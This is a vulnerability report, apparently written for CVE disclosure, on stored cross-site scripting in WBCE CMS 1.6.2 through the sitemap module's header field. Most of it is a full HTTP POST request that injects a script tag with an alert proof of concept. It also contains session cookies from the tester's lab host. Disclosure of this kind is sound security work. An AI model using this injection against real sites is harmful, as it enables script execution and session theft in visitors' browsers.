Vulnerability type : Cross Site Scripting

Vendor of the product(s) : https://wbce.org/de/wbce、https://github.com/WBCE/WBCE_CMS

Affected Product Code Base : WBCE_CMS =1.6.2

Affected Component : /admin/pages/modify.php、/wbce/modules/sitemap/save.php

Attack Type : Remote

Attack Vectors : Users can insert JavaScript statements by controlling website_header


Stored Cross-Site Scripting

![](https://github.com/WindyAlexQ/CVE/blob/main/images/259173815259273.png)

request packet

```
POST /wbce/modules/sitemap/save.php HTTP/1.1
Host: 192.168.168.129
Content-Length: 370
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.168.129
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.168.129/wbce/admin/pages/modify.php?page_id=4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session_b2evo=1_8Lvt6Brj6zjgD62GctG92mRj3pftZwEK; loginstate=false; phpsessid-9277-sid=c7ufghg4icqd737a3segkc1ith; stElem___stickySidebarElement=%5Bid%3A0%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A1%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A2%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A3%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A4%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A5%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A6%5D%5Bvalue%3AnoClass%5D%23; WBCELastConnectJS=1722929712
Connection: close

page_id=4&section_id=4&static=1&formtoken=23cd25eb-c83644b5f00c0344e9652534dc6a7dc0bf26cd39&startatroot=1&depth=0&all_menus=0&header=%3Cscript%3Ealert%28%22xss+test%21%22%29%3C%2Fscript%3E&level_header=%3Cul%3E&sitemaploop=%3Cli%3E%3Ca+href%3D%22%5BLINK%5D%22+target%3D%22%5BTARGET%5D%22%3E%5BPAGE_TITLE%5D%3C%2Fa%3E%3C%2Fli%3E&level_footer=%3C%2Ful%3E&footer=&save=Save
```



![](https://github.com/WindyAlexQ/CVE/blob/main/images/516704015247140.png)
